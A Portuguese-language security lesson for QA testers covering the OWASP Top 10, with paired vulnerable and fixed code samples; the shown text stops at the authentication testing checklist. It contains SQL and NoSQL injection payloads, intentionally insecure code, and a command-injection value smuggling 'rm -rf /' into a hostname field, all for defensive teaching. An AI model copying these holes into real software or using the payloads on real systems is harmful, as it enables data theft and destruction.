---
layout: lesson
title: "Aula 1.2: OWASP Top 10 e Principais Vulnerabilidades"
slug: owasp-top-10
module: module-1
lesson_id: lesson-1-2
duration: "90 minutos"
level: "Básico"
prerequisites: ["lesson-1-1"]
exercises: 
  - lesson-1-2-exercise-1-identificar-vulnerabilidades
  - lesson-1-2-exercise-2-sql-injection
  - lesson-1-2-exercise-4-broken-access-control
  - lesson-1-2-exercise-5-owasp-checklist
podcast:
  file: "assets/podcasts/1.2-OWASP_Top_10.m4a"
  image: "assets/images/podcasts/1.2-OWASP_Top_10.png"
  title: "OWASP Top 10 - Vulnerabilidades que Todo QA Deve Conhecer"
  description: "Análise detalhada das 10 principais vulnerabilidades de segurança web segundo OWASP: Injection, Broken Authentication, XSS, e mais. Aprenda a identificá-las em testes."
  duration: "60-75 minutos"
permalink: /modules/fundamentos-seguranca-qa/lessons/owasp-top-10/
---

# Aula 1.2: OWASP Top 10 e Principais Vulnerabilidades

## 🎯 Objetivos de Aprendizado

Ao final desta aula, você será capaz de:

- Conhecer as 10 principais vulnerabilidades web (OWASP Top 10 2021)
- Entender como cada vulnerabilidade funciona tecnicamente
- Aprender a identificá-las em testes de segurança
- Saber como prevenir e mitigar cada tipo de vulnerabilidade
- Aplicar conhecimento em contextos específicos de projetos CWI (Financeiro, Educacional, Ecommerce)

## 📚 Introdução ao OWASP Top 10

O **OWASP Top 10** é uma lista das 10 vulnerabilidades de segurança web mais críticas, publicada pela OWASP (Open Web Application Security Project). A versão atual é de 2021, atualizada a cada 3-4 anos com base em dados reais de vulnerabilidades encontradas em aplicações.

### Por que o OWASP Top 10 é Importante?

- **Baseado em dados reais**: Compilado de milhões de vulnerabilidades encontradas em aplicações reais
- **Linguagem comum**: Permite comunicação efetiva entre Dev, QA e Security
- **Foco prático**: Prioriza vulnerabilidades mais comuns e impactantes
- **Atualizado regularmente**: Reflete as ameaças atuais do mundo real

### Evolução do OWASP Top 10

```
2010 → 2013 → 2017 → 2021
  │      │      │      │
  └──────┴──────┴──────┘
  Evolução das ameaças web
```

**Mudanças significativas em 2021**:
- Inclusão de "Insecure Design" (novo)
- "Server-Side Request Forgery (SSRF)" entrou no Top 10
- Foco maior em APIs e arquiteturas modernas

---

## 🔟 As 10 Vulnerabilidades Críticas

### 1. Broken Access Control

#### 🎭 Analogia: O Porteiro Distraído

Imagine um prédio com um porteiro que deveria verificar se você tem permissão para entrar em cada apartamento.

**Cenário Normal**:
- Você pede: "Quero entrar no apartamento 501"
- Porteiro verifica: "Você é o dono do 501? Não? Então não pode entrar" ✅

**Cenário de Ataque (Broken Access Control)**:
- Você pede: "Quero entrar no apartamento 501"
- Porteiro não verifica nada e abre a porta ❌
- Você acessa dados de outra pessoa sem autorização

Na web, isso acontece quando a aplicação não valida adequadamente se o usuário tem permissão para acessar um recurso específico.

#### Definição Técnica

**Broken Access Control** ocorre quando restrições de acesso não são aplicadas corretamente, permitindo que usuários acessem recursos ou executem ações além de suas permissões.

#### Fluxo de Ataque

```
┌─────────────────────────────────────────────────────────┐
│  FLUXO DE BROKEN ACCESS CONTROL                         │
│                                                         │
│  Atacante                    Aplicação                 │
│    │                            │                      │
│    │──GET /api/users/123───────>│                      │
│    │                            │                      │
│    │                            │ ❌ Não verifica      │
│    │                            │    se usuário        │
│    │                            │    logado é o        │
│    │                            │    dono do ID 123    │
│    │                            │                      │
│    │<──DADOS DO USUÁRIO 123────│                      │
│    │                            │                      │
│    │                            │                      │
│    │──GET /api/admin/users─────>│                      │
│    │                            │                      │
│    │                            │ ❌ Não verifica      │
│    │                            │    se usuário        │
│    │                            │    é admin           │
│    │                            │                      │
│    │<──LISTA DE TODOS USERS────│                      │
│    │                            │                      │
└─────────────────────────────────────────────────────────┘
```

#### Exemplos Práticos

**Exemplo 1: Acesso Direto a Objetos (IDOR - Insecure Direct Object Reference)**

```python
# ❌ VULNERÁVEL - Não valida propriedade
@app.route('/api/users/<user_id>')
def get_user(user_id):
    user = db.get_user(user_id)  # Não verifica se usuário logado é o dono
    return jsonify(user)

# Ataque possível:
# GET /api/users/456 (usuário logado é 123)
# Resultado: Acessa dados de outro usuário!
```

```python
# ✅ SEGURO - Valida propriedade
@app.route('/api/users/<user_id>')
def get_user(user_id):
    current_user_id = session['user_id']
    if int(user_id) != current_user_id:
        return jsonify({'error': 'Unauthorized'}), 403
    user = db.get_user(user_id)
    return jsonify(user)
```

**Exemplo 2: Elevação de Privilégios**

```python
# ❌ VULNERÁVEL - Confia em parâmetro do cliente
@app.route('/api/admin/users')
def admin_users():
    is_admin = request.json.get('is_admin', False)  # Cliente pode enviar True!
    if is_admin:
        return jsonify(db.get_all_users())
    return jsonify({'error': 'Forbidden'}), 403

# Ataque:
# POST /api/admin/users {"is_admin": true}
# Resultado: Usuário comum vira admin!
```

```python
# ✅ SEGURO - Valida no servidor
@app.route('/api/admin/users')
def admin_users():
    current_user = db.get_user(session['user_id'])
    if not current_user.is_admin:  # Valida no servidor
        return jsonify({'error': 'Forbidden'}), 403
    return jsonify(db.get_all_users())
```

#### Contexto CWI - Casos Reais

**Caso Financeiro (Fintech)**:
Em um projeto de fintech da CWI, identificamos que endpoints de consulta de extrato não validavam se o usuário logado era o dono da conta consultada. Um usuário poderia modificar o ID da conta na URL e acessar extratos de outras pessoas. A correção implementou validação de propriedade em todos os endpoints sensíveis.

**Caso Educacional (EdTech)**:
Em uma plataforma educacional, alunos conseguiam acessar notas de outros alunos modificando o ID do aluno na URL. A vulnerabilidade foi corrigida adicionando validação de permissão baseada em relacionamento aluno-turma.

#### Como Testar

**Checklist de Testes**:
- [ ] Tentar acessar recursos de outros usuários modificando IDs na URL
- [ ] Testar endpoints administrativos sem ser admin
- [ ] Verificar se tokens de sessão são validados corretamente
- [ ] Testar navegação forçada para páginas protegidas
- [ ] Validar controles de autorização em todas as operações CRUD

**Exemplo de Teste Manual**:
```bash
# 1. Login como usuário comum
POST /api/login {"email": "user@example.com", "password": "pass123"}
# Recebe token: abc123

# 2. Tentar acessar recurso de outro usuário
GET /api/users/999
Authorization: Bearer abc123
# ❌ Deve retornar 403 Forbidden

# 3. Tentar acessar endpoint admin
GET /api/admin/users
Authorization: Bearer abc123
# ❌ Deve retornar 403 Forbidden
```

#### Prevenção

**Boas Práticas**:
1. **Sempre validar no servidor**: Nunca confie em validações apenas no cliente
2. **Princípio do menor privilégio**: Usuários só devem ter acesso ao mínimo necessário
3. **Validação de propriedade**: Verificar se usuário é dono do recurso antes de permitir acesso
4. **Controle de acesso baseado em roles**: Implementar RBAC (Role-Based Access Control)
5. **Testes de autorização**: Criar testes automatizados para validar controles de acesso

---

### 2. Cryptographic Failures

#### 🎭 Analogia: A Carta Aberta

Imagine enviar uma carta confidencial pelo correio.

**Cenário Seguro**:
- Você coloca a carta em um envelope lacrado ✅
- Apenas o destinatário pode abrir ✅

**Cenário Vulnerável (Cryptographic Failures)**:
- Você envia a carta sem envelope ❌
- Qualquer um que pegue pode ler o conteúdo ❌

Na web, isso acontece quando dados sensíveis não são protegidos adequadamente com criptografia.

#### Definição Técnica

**Cryptographic Failures** (anteriormente "Sensitive Data Exposure") ocorre quando dados sensíveis não são protegidos adequadamente com criptografia, seja em trânsito (HTTPS) ou em repouso (banco de dados).

#### Tipos de Falhas Criptográficas

| Tipo | Descrição | Impacto |
|------|-----------|---------|
| **Dados em texto plano** | Senhas, tokens armazenados sem hash | Crítico - Acesso total ao sistema |
| **HTTPS ausente** | Dados transmitidos via HTTP | Crítico - Interceptação de dados |
| **Algoritmos fracos** | MD5, SHA1, DES, RC4 | Alto - Vulnerável a ataques |
| **Chaves expostas** | Chaves de criptografia no código | Crítico - Decriptografia possível |
| **Certificados inválidos** | Certificados SSL auto-assinados ou expirados | Médio - Man-in-the-middle |

#### Exemplos Práticos

**Exemplo 1: Senhas em Texto Plano**

```python
# ❌ VULNERÁVEL - Senha em texto plano
def create_user(username, password):
    db.users.insert({
        'username': username,
        'password': password  # Armazenado em texto plano!
    })

# Se banco for comprometido, todas as senhas são expostas
```

```python
# ✅ SEGURO - Hash com bcrypt
import bcrypt

def create_user(username, password):
    hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
    db.users.insert({
        'username': username,
        'password': hashed  # Hash irreversível
    })

def verify_password(password, hashed):
    return bcrypt.checkpw(password.encode('utf-8'), hashed)
```

**Exemplo 2: Dados Transmitidos sem HTTPS**

```python
# ❌ VULNERÁVEL - API sem HTTPS
@app.route('/api/login', methods=['POST'])
def login():
    # Dados enviados via HTTP podem ser interceptados
    username = request.json['username']
    password = request.json['password']
    # ...
```

```python
# ✅ SEGURO - Forçar HTTPS
from flask_sslify import SSLify

app = Flask(__name__)
sslify = SSLify(app)  # Redireciona HTTP para HTTPS

@app.route('/api/login', methods=['POST'])
def login():
    # Dados protegidos via HTTPS
    username = request.json['username']
    password = request.json['password']
    # ...
```

#### Contexto CWI - Casos Reais

**Caso Financeiro (PCI-DSS)**:
Em um projeto financeiro, identificamos que números de cartão eram armazenados sem criptografia adequada. Para compliance PCI-DSS, implementamos tokenização (substituição por tokens) e criptografia AES-256 para dados sensíveis.

**Caso Educacional (LGPD)**:
Em uma plataforma educacional, dados de menores eram transmitidos via HTTP em algumas rotas. Implementamos HTTPS obrigatório e criptografia adicional para dados sensíveis de menores.

#### Como Testar

**Checklist de Testes**:
- [ ] Verificar se senhas são armazenadas com hash (nunca texto plano)
- [ ] Confirmar que toda comunicação usa HTTPS
- [ ] Validar que algoritmos de hash são seguros (bcrypt, Argon2, scrypt)
- [ ] Verificar se chaves de criptografia não estão no código
- [ ] Testar se certificados SSL são válidos e não expirados

**Exemplo de Teste**:
```bash
# 1. Verificar se senha está em texto plano no banco
# ❌ Se encontrar senha legível, é vulnerável

# 2. Testar se API aceita HTTP
curl http://api.example.com/login
# ❌ Deve redirecionar para HTTPS ou negar

# 3. Verificar certificado SSL
openssl s_client -connect api.example.com:443
# ✅ Deve mostrar certificado válido
```

#### Prevenção

**Boas Práticas**:
1. **Hash de senhas**: Sempre usar bcrypt, Argon2 ou scrypt (nunca MD5/SHA1)
2. **HTTPS obrigatório**: Forçar HTTPS em todas as conexões
3. **Criptografia em repouso**: Criptografar dados sensíveis no banco
4. **Gerenciamento de chaves**: Usar serviços como AWS KMS, HashiCorp Vault
5. **Algoritmos atualizados**: Usar AES-256, RSA 2048+, ECDSA

---

### 3. Injection

#### 🎭 Analogia: A Biblioteca Enganada

Imagine uma biblioteca com um atendente que busca livros baseado no que você escreve num papel.

**Cenário Normal**:
- Você escreve: "Livro de Python"
- Atendente busca: "Livro de Python"
- Resultado: Recebe o livro correto ✅

**Cenário de Ataque (SQL Injection)**:
- Você escreve: "Livro de Python' OR '1'='1"
- Atendente busca: "Livro de Python' OR '1'='1"
- Resultado: Recebe TODOS os livros da biblioteca! ❌

O atendente (banco de dados) foi enganado porque não validou a entrada.

#### Definição Técnica

**Injection** ocorre quando dados não confiáveis são enviados a um interpretador como parte de um comando ou query, permitindo que o atacante execute comandos não autorizados.

#### Tipos de Injection

| Tipo | Onde Ocorre | Impacto |
|------|-------------|---------|
| **SQL Injection** | Consultas SQL | Crítico - Acesso ao banco de dados |
| **NoSQL Injection** | Consultas MongoDB, CouchDB | Crítico - Acesso ao banco de dados |
| **Command Injection** | Comandos do sistema operacional | Crítico - Execução de comandos |
| **LDAP Injection** | Consultas LDAP | Alto - Acesso a diretórios |
| **XPath Injection** | Consultas XPath | Médio - Acesso a dados XML |

#### Fluxo de SQL Injection

```
┌─────────────────────────────────────────────────────────┐
│  FLUXO DE SQL INJECTION                                 │
│                                                         │
│  Cliente                    Aplicação        Banco      │
│    │                            │              │        │
│    │──"user' OR '1'='1"────────>│              │        │
│    │                            │              │        │
│    │                            │──SELECT * ──>│        │
│    │                            │   FROM users │        │
│    │                            │   WHERE name│        │
│    │                            │   = 'user'   │        │
│    │                            │   OR '1'='1' │        │
│    │                            │              │        │
│    │                            │<─TODOS USERS─┤        │
│    │                            │              │        │
│    │<───DADOS VAZADOS──────────│              │        │
│    │                                                    │
└─────────────────────────────────────────────────────────┘

SOLUÇÃO: Usar Prepared Statements / Parametrized Queries
```

#### Exemplos Práticos

**Exemplo 1: SQL Injection Clássica**

```python
# ❌ VULNERÁVEL - Concatenação de strings
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# Ataque possível:
# username = "admin' OR '1'='1' --"
# Query executada: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
# Resultado: Retorna TODOS os usuários!
```

```python
# ✅ SEGURO - Prepared Statements
def get_user(username):
    query = "SELECT * FROM users WHERE username = ?"
    return db.execute(query, (username,))

# Mesmo com ataque:
# username = "admin' OR '1'='1' --"
# Query busca literalmente por um usuário com esse nome (que não existe)
# Resultado: Nenhum usuário retornado ✅
```

**Exemplo 2: NoSQL Injection**

```javascript
// ❌ VULNERÁVEL - Concatenação direta
app.post('/api/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    
    const query = {
        username: username,
        password: password
    };
    
    User.findOne(query, (err, user) => {
        // ...
    });
});

// Ataque possível:
// POST /api/login
// {"username": {"$ne": null}, "password": {"$ne": null}}
// Resultado: Retorna primeiro usuário encontrado (bypass de login)!
```

```javascript
// ✅ SEGURO - Validação e sanitização
app.post('/api/login', (req, res) => {
    const username = String(req.body.username);  // Força string
    const password = String(req.body.password);  // Força string
    
    // Validação adicional
    if (typeof username !== 'string' || username.length === 0) {
        return res.status(400).json({error: 'Invalid username'});
    }
    
    const query = {
        username: username,
        password: password
    };
    
    User.findOne(query, (err, user) => {
        // ...
    });
});
```

**Exemplo 3: Command Injection**

```python
# ❌ VULNERÁVEL - Execução direta de comando
import os

def ping_host(hostname):
    result = os.system(f"ping -c 4 {hostname}")  # Perigoso!
    return result

# Ataque possível:
# hostname = "google.com; rm -rf /"
# Resultado: Executa comando malicioso!
```

```python
# ✅ SEGURO - Validação e subprocess
import subprocess
import re

def ping_host(hostname):
    # Validação de entrada
    if not re.match(r'^[a-zA-Z0-9.-]+$', hostname):
        raise ValueError('Invalid hostname')
    
    # Usa subprocess com lista de argumentos
    result = subprocess.run(['ping', '-c', '4', hostname], 
                          capture_output=True, text=True)
    return result.stdout
```

#### Contexto CWI - Casos Reais

**Caso Financeiro (Fintech)**:
Em um dos projetos financeiros da CWI, identificamos SQL Injection em endpoint de consulta de extratos. A correção usando prepared statements evitou exposição de dados bancários de 500k+ usuários.

**Caso Ecommerce**:
Em uma plataforma de ecommerce, NoSQL Injection permitia bypass de autenticação. A correção implementou validação rigorosa de tipos e sanitização de entrada.

#### Como Testar

**Checklist de Testes**:
- [ ] Testar SQL Injection em todos os campos de entrada
- [ ] Tentar NoSQL Injection em APIs que usam MongoDB
- [ ] Testar Command Injection em funcionalidades que executam comandos
- [ ] Validar se prepared statements são usados em todas as queries
- [ ] Verificar sanitização de entrada em todos os endpoints

**Exemplo de Teste Manual**:
```bash
# 1. Teste SQL Injection básico
POST /api/login
{"username": "admin' OR '1'='1", "password": "anything"}
# ❌ Se retornar sucesso, é vulnerável

# 2. Teste SQL Injection com comentário
POST /api/search
{"query": "test' --"}
# ❌ Se executar sem erro, pode ser vulnerável

# 3. Teste NoSQL Injection
POST /api/users
{"username": {"$ne": null}, "email": {"$ne": null}}
# ❌ Se retornar dados, é vulnerável
```

#### Prevenção

**Boas Práticas**:
1. **SEMPRE use Prepared Statements**: Separa código de dados
2. **Validação de Entrada**: Valide e sanitize TODOS os inputs
3. **Princípio do Menor Privilégio**: Banco de dados com permissões mínimas
4. **ORM Seguro**: Use ORMs que previnem injection automaticamente
5. **Whitelist vs Blacklist**: Prefira whitelist (permitir apenas o válido)

---

### 4. Insecure Design

#### 🎭 Analogia: A Casa com Fundação Fraca

Imagine construir uma casa.

**Cenário Seguro**:
- Você projeta a fundação forte desde o início ✅
- A casa é segura por design ✅

**Cenário Vulnerável (Insecure Design)**:
- Você constrói sem planejar a segurança ❌
- Depois tenta adicionar segurança como remendo ❌
- A fundação continua fraca ❌

Na segurança de software, isso acontece quando o design não considera segurança desde o início.

#### Definição Técnica

**Insecure Design** é uma categoria focada em riscos relacionados a falhas de design e arquitetura. Diferente de "Security Misconfiguration", aqui o problema está na concepção inicial, não na implementação.

#### Exemplos de Insecure Design

| Problema | Descrição | Impacto |
|----------|-----------|---------|
| **Falta de Threat Modeling** | Não identifica ameaças no design | Alto - Vulnerabilidades não previstas |
| **Autenticação fraca por design** | Sistema permite senhas fracas | Crítico - Acesso não autorizado |
| **Falta de rate limiting** | Não limita tentativas de login | Alto - Ataques de força bruta |
| **Arquitetura sem isolamento** | Componentes compartilham recursos | Alto - Escalação de privilégios |
| **Falta de validação de negócio** | Regras de negócio não validadas | Médio - Fraudes e abusos |

#### Exemplos Práticos

**Exemplo 1: Falta de Rate Limiting**

```python
# ❌ VULNERÁVEL - Sem rate limiting
@app.route('/api/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']
    
    user = authenticate(username, password)
    if user:
        return {'token': generate_token(user)}
    else:
        return {'error': 'Invalid credentials'}, 401

# Ataque possível: Força bruta sem limites
# Tentativas ilimitadas de login
```

```python
# ✅ SEGURO - Rate limiting implementado
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # Máximo 5 tentativas por minuto
def login():
    username = request.json['username']
    password = request.json['password']
    
    user = authenticate(username, password)
    if user:
        return {'token': generate_token(user)}
    else:
        return {'error': 'Invalid credentials'}, 401
```

**Exemplo 2: Validação de Negócio Faltando**

```python
# ❌ VULNERÁVEL - Não valida regras de negócio
@app.route('/api/transfer', methods=['POST'])
def transfer():
    from_account = request.json['from_account']
    to_account = request.json['to_account']
    amount = request.json['amount']
    
    # Não valida se usuário é dono da conta origem
    # Não valida limites de transferência
    # Não valida se conta destino existe
    
    transfer_money(from_account, to_account, amount)
    return {'success': True}

# Ataque possível: Transferir dinheiro de qualquer conta
```

```python
# ✅ SEGURO - Validação completa de negócio
@app.route('/api/transfer', methods=['POST'])
@require_auth
def transfer():
    current_user_id = session['user_id']
    from_account = request.json['from_account']
    to_account = request.json['to_account']
    amount = float(request.json['amount'])
    
    # Validação 1: Usuário é dono da conta origem
    account = db.get_account(from_account)
    if account.user_id != current_user_id:
        return {'error': 'Unauthorized'}, 403
    
    # Validação 2: Conta destino existe
    if not db.account_exists(to_account):
        return {'error': 'Destination account not found'}, 404
    
    # Validação 3: Saldo suficiente
    if account.balance < amount:
        return {'error': 'Insufficient funds'}, 400
    
    # Validação 4: Limite de transferência
    if amount > account.transfer_limit:
        return {'error': 'Amount exceeds transfer limit'}, 400
    
    # Validação 5: Não permite transferência para si mesmo
    if from_account == to_account:
        return {'error': 'Cannot transfer to same account'}, 400
    
    transfer_money(from_account, to_account, amount)
    return {'success': True}
```

#### Contexto CWI - Casos Reais

**Caso Financeiro (Open Banking)**:
Em um projeto de Open Banking, o design inicial não considerava rate limiting adequado. Implementamos throttling por API key e por IP para prevenir abusos e garantir compliance.

**Caso Ecommerce**:
Em uma plataforma de ecommerce, o design não previa validação de estoque em tempo real. Implementamos validação transacional para prevenir overselling.

#### Como Testar

**Checklist de Testes**:
- [ ] Verificar se há rate limiting em endpoints críticos
- [ ] Testar validação de regras de negócio
- [ ] Validar isolamento entre usuários/recursos
- [ ] Verificar se autenticação é forte por design
- [ ] Testar cenários de abuso e fraude

#### Prevenção

**Boas Práticas**:
1. **Threat Modeling**: Identificar ameaças no design
2. **Security by Design**: Considerar segurança desde o início
3. **Validação de Negócio**: Implementar todas as regras de negócio
4. **Rate Limiting**: Limitar tentativas e requisições
5. **Isolamento**: Isolar recursos entre usuários/tenants

---

### 5. Security Misconfiguration

#### 🎭 Analogia: A Casa com Portas Abertas

Imagine uma casa com todas as portas e janelas abertas.

**Cenário Seguro**:
- Portas trancadas ✅
- Janelas fechadas ✅
- Sistema de alarme ativado ✅

**Cenário Vulnerável (Security Misconfiguration)**:
- Portas abertas ❌
- Janelas abertas ❌
- Sistema de alarme desativado ❌
- Chaves deixadas na porta ❌

Na segurança de software, isso acontece quando configurações padrão inseguras são mantidas ou configurações de segurança não são aplicadas corretamente.

#### Definição Técnica

**Security Misconfiguration** ocorre quando componentes de segurança não são configurados corretamente, deixando a aplicação vulnerável. Isso inclui configurações padrão inseguras, mensagens de erro detalhadas, serviços desnecessários habilitados, etc.

#### Tipos Comuns de Misconfiguration

| Tipo | Descrição | Impacto |
|------|-----------|---------|
| **Configurações padrão** | Senhas padrão, contas padrão | Crítico - Acesso não autorizado |
| **Mensagens de erro detalhadas** | Stack traces expostos | Médio - Informação para atacantes |
| **Serviços desnecessários** | Portas abertas, serviços habilitados | Alto - Superfície de ataque maior |
| **Headers de segurança ausentes** | Sem CSP, HSTS, etc. | Médio - Vulnerável a XSS, MITM |
| **Permissões excessivas** | Arquivos/diretórios com permissões erradas | Alto - Acesso não autorizado |

#### Exemplos Práticos

**Exemplo 1: Mensagens de Erro Detalhadas**

```python
# ❌ VULNERÁVEL - Stack trace exposto
@app.route('/api/users/<user_id>')
def get_user(user_id):
    try:
        user = db.get_user(user_id)
        return jsonify(user)
    except Exception as e:
        return jsonify({'error': str(e)}), 500  # Expõe detalhes internos!

# Erro retornado:
# {"error": "FileNotFoundError: /var/db/users.db at line 123"}
# Atacante descobre estrutura interna!
```

```python
# ✅ SEGURO - Mensagens genéricas em produção
import logging

@app.route('/api/users/<user_id>')
def get_user(user_id):
    try:
        user = db.get_user(user_id)
        return jsonify(user)
    except Exception as e:
        # Log detalhado apenas no servidor
        logging.error(f"Error getting user {user_id}: {str(e)}")
        
        # Mensagem genérica para cliente
        if app.config['DEBUG']:
            return jsonify({'error': str(e)}), 500
        else:
            return jsonify({'error': 'Internal server error'}), 500
```

**Exemplo 2: Headers de Segurança Ausentes**

```python
# ❌ VULNERÁVEL - Sem headers de segurança
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return '<h1>Hello World</h1>'

# Sem proteção contra XSS, clickjacking, etc.
```

```python
# ✅ SEGURO - Headers de segurança configurados
from flask import Flask
from flask_talisman import Talisman

app = Flask(__name__)

# Configura headers de segurança automaticamente
Talisman(app, 
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
    }
)

@app.route('/')
def index():
    return '<h1>Hello World</h1>'

# Agora tem:
# - HSTS (HTTP Strict Transport Security)
# - CSP (Content Security Policy)
# - X-Frame-Options
# - X-Content-Type-Options
```

**Exemplo 3: Configurações Padrão Inseguras**

```python
# ❌ VULNERÁVEL - Credenciais padrão
DATABASE_CONFIG = {
    'host': 'localhost',
    'user': 'admin',      # Usuário padrão
    'password': 'admin',  # Senha padrão!
    'database': 'app_db'
}

# Qualquer um que conheça o padrão pode acessar!
```

```python
# ✅ SEGURO - Credenciais de variáveis de ambiente
import os

DATABASE_CONFIG = {
    'host': os.getenv('DB_HOST', 'localhost'),
    'user': os.getenv('DB_USER'),      # Obrigatório
    'password': os.getenv('DB_PASSWORD'),  # Obrigatório
    'database': os.getenv('DB_NAME', 'app_db')
}

# Validação
if not DATABASE_CONFIG['user'] or not DATABASE_CONFIG['password']:
    raise ValueError('Database credentials must be set via environment variables')
```

#### Contexto CWI - Casos Reais

**Caso Geral**:
Em vários projetos CWI, identificamos que ambientes de desenvolvimento expunham stack traces detalhados. Implementamos configuração diferenciada por ambiente, com mensagens genéricas em produção.

**Caso Cloud**:
Em um projeto hospedado na AWS, buckets S3 estavam configurados como públicos por padrão. Corrigimos para privados com acesso controlado via IAM.

#### Como Testar

**Checklist de Testes**:
- [ ] Verificar se não há credenciais padrão
- [ ] Testar se mensagens de erro não expõem detalhes
- [ ] Validar headers de segurança (CSP, HSTS, etc.)
- [ ] Verificar se serviços desnecessários estão desabilitados
- [ ] Testar permissões de arquivos e diretórios

**Exemplo de Teste**:
```bash
# 1. Verificar headers de segurança
curl -I https://api.example.com
# Deve ter:
# - Strict-Transport-Security
# - Content-Security-Policy
# - X-Frame-Options

# 2. Testar mensagens de erro
curl https://api.example.com/invalid-endpoint
# Não deve expor stack trace ou caminhos de arquivo

# 3. Verificar configurações padrão
# Tentar login com credenciais padrão conhecidas
```

#### Prevenção

**Boas Práticas**:
1. **Remover configurações padrão**: Mudar todas as senhas/credenciais padrão
2. **Hardening**: Desabilitar serviços e recursos desnecessários
3. **Headers de Segurança**: Implementar CSP, HSTS, X-Frame-Options
4. **Mensagens de Erro**: Mensagens genéricas em produção
5. **Configuração por Ambiente**: Diferentes configurações para dev/staging/prod

---

### 6. Vulnerable and Outdated Components

#### 🎭 Analogia: A Biblioteca com Livros Antigos

Imagine uma biblioteca que nunca atualiza seus livros.

**Cenário Seguro**:
- Livros atualizados com correções ✅
- Versões mais recentes ✅

**Cenário Vulnerável**:
- Livros antigos com erros conhecidos ❌
- Versões desatualizadas ❌
- Vulnerabilidades conhecidas não corrigidas ❌

Na segurança de software, isso acontece quando bibliotecas e componentes têm vulnerabilidades conhecidas que não foram corrigidas.

#### Definição Técnica

**Vulnerable and Outdated Components** ocorre quando componentes (bibliotecas, frameworks, dependências) têm vulnerabilidades conhecidas que não foram atualizadas ou corrigidas.

#### Exemplos Práticos

**Exemplo: Dependência Vulnerável**

```json
// ❌ VULNERÁVEL - package.json com versão antiga
{
  "dependencies": {
    "express": "4.16.0",  // Versão antiga com vulnerabilidades conhecidas
    "lodash": "4.17.10"   // Versão antiga
  }
}
```

```json
// ✅ SEGURO - Versões atualizadas e verificadas
{
  "dependencies": {
    "express": "^4.18.2",  // Versão atualizada
    "lodash": "^4.17.21"   // Versão atualizada
  }
}
```

**Ferramentas de Verificação**:
- **npm audit**: Verifica vulnerabilidades em Node.js
- **pip-audit**: Verifica vulnerabilidades em Python
- **OWASP Dependency-Check**: Scanner genérico
- **Snyk**: Scanner comercial
- **Dependabot**: Atualizações automáticas (GitHub)

#### Contexto CWI - Casos Reais

**Caso Geral**:
Em vários projetos CWI, implementamos verificação automática de dependências vulneráveis no pipeline CI/CD usando Snyk e Dependabot, prevenindo uso de bibliotecas com vulnerabilidades conhecidas.

#### Como Testar

**Checklist de Testes**:
- [ ] Executar scanners de dependências regularmente
- [ ] Verificar se há atualizações de segurança disponíveis
- [ ] Validar se vulnerabilidades conhecidas foram corrigidas
- [ ] Testar atualizações em ambiente de staging antes de produção

#### Prevenção

**Boas Práticas**:
1. **Inventário de Dependências**: Manter lista atualizada de todas as dependências
2. **Monitoramento Contínuo**: Usar ferramentas como Snyk, Dependabot
3. **Atualizações Regulares**: Atualizar dependências regularmente
4. **Testes de Regressão**: Testar após atualizações
5. **Remoção de Dependências Não Usadas**: Reduzir superfície de ataque

---

### 7. Identification and Authentication Failures

#### 🎭 Analogia: O Porteiro que Não Verifica Identidade

Imagine um porteiro que deixa qualquer um entrar sem verificar identidade.

**Cenário Seguro**:
- Verifica documento de identidade ✅
- Confirma se pessoa está autorizada ✅

**Cenário Vulnerável**:
- Deixa qualquer um entrar ❌
- Não verifica identidade ❌

Na segurança de software, isso acontece quando autenticação e identificação são implementadas incorretamente.

#### Definição Técnica

**Identification and Authentication Failures** (anteriormente "Broken Authentication") ocorre quando funções de autenticação são implementadas incorretamente, permitindo que atacantes comprometam senhas, tokens de sessão ou explorem falhas de implementação.

#### Tipos de Falhas

| Tipo | Descrição | Impacto |
|------|-----------|---------|
| **Senhas fracas** | Permite senhas simples | Alto - Ataques de força bruta |
| **Sessões não invalidadas** | Sessões permanecem válidas após logout | Alto - Ataques de sessão |
| **Credenciais expostas** | Tokens/senhas em logs ou URLs | Crítico - Acesso não autorizado |
| **Falta de MFA** | Apenas senha, sem 2FA | Médio - Vulnerável a phishing |
| **Força bruta não limitada** | Tentativas ilimitadas de login | Alto - Quebra de senhas |

#### Exemplos Práticos

**Exemplo 1: Sessões Não Invalidadas**

```python
# ❌ VULNERÁVEL - Sessão não invalidada no logout
@app.route('/api/logout', methods=['POST'])
def logout():
    session.clear()  # Limpa sessão local, mas token ainda válido!
    return {'success': True}

# Token ainda pode ser usado até expirar!
```

```python
# ✅ SEGURO - Invalidação completa de sessão
from datetime import datetime

# Tabela de tokens invalidados
blacklisted_tokens = set()

@app.route('/api/logout', methods=['POST'])
@require_auth
def logout():
    token = request.headers.get('Authorization').split(' ')[1]
    
    # Adiciona token à blacklist
    blacklisted_tokens.add(token)
    
    # Também invalida no banco de dados
    db.invalidate_session(session['session_id'])
    
    session.clear()
    return {'success': True}

@app.before_request
def check_token():
    token = request.headers.get('Authorization')
    if token and token.split(' ')[1] in blacklisted_tokens:
        return {'error': 'Token invalidated'}, 401
```

**Exemplo 2: Senhas Fracas Permitidas**

```python
# ❌ VULNERÁVEL - Aceita qualquer senha
def validate_password(password):
    return len(password) >= 4  # Muito fraco!

# Permite senhas como "1234", "pass", etc.
```

```python
# ✅ SEGURO - Validação forte de senha
import re

def validate_password(password):
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    
    if not re.search(r'[A-Z]', password):
        return False, "Password must contain uppercase letter"
    
    if not re.search(r'[a-z]', password):
        return False, "Password must contain lowercase letter"
    
    if not re.search(r'[0-9]', password):
        return False, "Password must contain number"
    
    if not re.search(r'[!@#$%^&*]', password):
        return False, "Password must contain special character"
    
    # Verifica senhas comuns
    common_passwords = ['password', '123456', 'qwerty']
    if password.lower() in common_passwords:
        return False, "Password is too common"
    
    return True, "Password is valid"
```

#### Contexto CWI - Casos Reais

**Caso Financeiro**:
Em projetos financeiros da CWI, implementamos autenticação forte com MFA obrigatório e rate limiting rigoroso para prevenir ataques de força bruta.

#### Como Testar

**Checklist de Testes**:
